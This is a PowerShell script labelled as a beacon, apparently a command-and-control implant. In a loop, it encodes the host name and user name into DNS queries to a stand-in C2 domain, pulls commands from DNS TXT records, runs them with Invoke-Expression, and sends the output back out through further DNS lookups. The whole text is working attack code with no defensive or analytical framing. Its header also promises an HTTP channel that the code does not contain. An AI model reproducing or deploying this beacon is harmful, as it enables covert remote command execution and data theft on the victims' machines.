
# PowerShell beacon — DNS exfil + IE COM for HTTP
$sid = [guid]::NewGuid().ToString().Substring(0,8)
$c2 = "c2.example.com"
$interval = 60
while ($true) {
    $info = "$env:COMPUTERNAME|$env:USERNAME"
    $enc = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($info)).Replace('=','').ToLower()
    try { [System.Net.Dns]::GetHostByName("$enc.$sid.$c2") } catch {}
    # task fetch via TXT
    try {
        $dns = Resolve-DnsName -Name "t.$sid.$c2" -Type TXT -ErrorAction SilentlyContinue
        if ($dns -and $dns.Strings -ne "IDLE") {
            $out = Invoke-Expression $dns.Strings 2>&1 | Out-String
            $b = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($out)).Replace('=','').ToLower()
            try { [System.Net.Dns]::GetHostByName("$b.$sid.$c2") } catch {}
        }
    } catch {}
    Start-Sleep -Seconds $interval
}
